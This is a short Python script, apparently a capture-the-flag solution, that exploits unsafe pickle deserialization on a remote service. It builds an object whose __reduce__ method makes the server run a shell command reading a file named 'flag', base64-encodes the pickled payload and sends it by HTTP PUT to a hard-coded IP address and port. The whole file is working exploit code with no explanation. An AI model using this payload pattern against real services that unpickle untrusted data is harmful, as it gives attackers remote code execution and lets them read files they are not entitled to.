import base64
import pickle

import httpx


class A:
    def __reduce__(self):
        import subprocess
        s = '''
import subprocess

r = subprocess.run(
    'cat flag', 
    shell=True,
    check=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)
print(r.stdout.decode())
        '''
        return (subprocess.check_output, (["python3","-c",s],))


a = A()
data = {
    'payload': base64.b64encode(pickle.dumps(a)).decode()
}
a = base64.b64decode(data['payload'])
r = httpx.put('http://160.202.254.160:18921/flag', json=data)
print(f'r:{r.text}')